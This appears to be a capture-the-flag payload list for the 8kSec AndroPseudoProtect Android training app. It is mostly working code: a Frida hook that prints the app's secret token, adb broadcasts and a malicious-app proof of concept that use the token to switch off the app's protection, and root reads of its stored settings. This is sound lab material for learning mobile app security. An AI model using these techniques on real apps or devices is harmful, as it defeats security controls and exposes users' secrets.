# ⚡ Payloads — AndroPseudoProtect (8kSec)

> Quick-reference payload list, in execution order. All commands are copy-paste ready.
> Full methodology, impact and remediation: `AndroPseudoProtect_Solution.md`

---

## 0️⃣ Setup

```bash
adb devices
adb install AndroPseudoProtect.apk
adb shell getprop ro.product.cpu.abi      # x86_64 (VMware VM) / arm64 (physical device)
```

---

## 1️⃣ Start frida-server — Terminal 1 (inside adb shell)

```bash
# Match the client version (frida --version) AND the device architecture
wget https://github.com/frida/frida/releases/download/17.11.0/frida-server-17.11.0-android-x86_64.xz
xz -d frida-server-17.11.0-android-x86_64.xz
adb push frida-server-17.11.0-android-x86_64 /data/local/tmp/frida-server
adb shell chmod 755 /data/local/tmp/frida-server

adb shell
cd /data/local/tmp
./frida-server        # ← stays hanging; leave it running
```

---

## 2️⃣ Verify the connection — Terminal 2 (host, no adb shell)

```bash
frida-ps -U           # must list processes before any further step
```

---

## 3️⃣ The Hook — save as `hook_token.js`

```javascript
Java.perform(function () {
    var SecurityUtils = Java.use("com.eightksec.andropseudoprotect.SecurityUtils");

    SecurityUtils.getSecurityToken.implementation = function () {
        var t = this.getSecurityToken();
        console.log("[+] TOKEN => " + t);
        return t;
    };

    console.log("[*] Hook installed on SecurityUtils.getSecurityToken()");
});
```

### Fallback script — class discovery (if class names differ in your build)

```javascript
Java.perform(function () {
    Java.enumerateLoadedClasses({
        onMatch: function (name) {
            if (name.toLowerCase().includes("security")) console.log("[class] " + name);
        },
        onComplete: function () { console.log("[*] done"); }
    });
});
```

### Run the hook

```bash
frida -U -f com.eightksec.andropseudoprotect -l hook_token.js
# ← open the app and press Start Security → the token prints in the console
```

---

## 4️⃣ Attack Payloads

### 🏁 Primary — stop security from outside the app

```bash
adb shell am broadcast \
  -n com.eightksec.andropseudoprotect/.SecurityReceiver \
  -a com.eightksec.andropseudoprotect.STOP_SECURITY \
  --es security_token <TOKEN_from_FRIDA>
```

### Enable security externally (full-control proof)

```bash
adb shell am broadcast \
  -n com.eightksec.andropseudoprotect/.SecurityReceiver \
  -a com.eightksec.andropseudoprotect.START_SECURITY \
  --es security_token <TOKEN>
```

### Via the Service directly (alternative)

```bash
adb shell am startservice \
  -n com.eightksec.andropseudoprotect/.SecurityService \
  -a com.eightksec.andropseudoprotect.STOP_SECURITY \
  --es security_token <TOKEN>
```

### With foreground flag — if you hit `Background execution not allowed`

```bash
adb shell am broadcast --receiver-foreground \
  -n com.eightksec.andropseudoprotect/.SecurityReceiver \
  -a com.eightksec.andropseudoprotect.STOP_SECURITY \
  --es security_token <TOKEN>
```

### POC — malicious app (no ADB at all)

```java
Intent i = new Intent("com.eightksec.andropseudoprotect.STOP_SECURITY");
i.setClassName("com.eightksec.andropseudoprotect",
               "com.eightksec.andropseudoprotect.SecurityReceiver");
i.putExtra("security_token", "<TOKEN>");
sendBroadcast(i);
```

---

## 5️⃣ Verification

```bash
# Canary file — definitive proof
adb shell "echo CANARY_TEST_12345 > /sdcard/test.txt"
adb shell cat /sdcard/test.txt       # before: readable → after the attack: readable again = success

# Stored application state (root)
adb shell "su -c 'cat /data/data/com.eightksec.andropseudoprotect/shared_prefs/*.xml'"

# Capture the toast right after the broadcast
adb exec-out screencap -p > toast.png

# Logcat (monitoring only — does not determine success)
adb logcat -d | grep -iE "SecurityNative|eightksec"
```

---

## ✅ Final Execution Order

```
adb install → frida-server (T1) → frida-ps -U (T2) → hook + Start Security
→ copy TOKEN → am broadcast STOP_SECURITY + TOKEN → canary/shared_prefs ✅
```
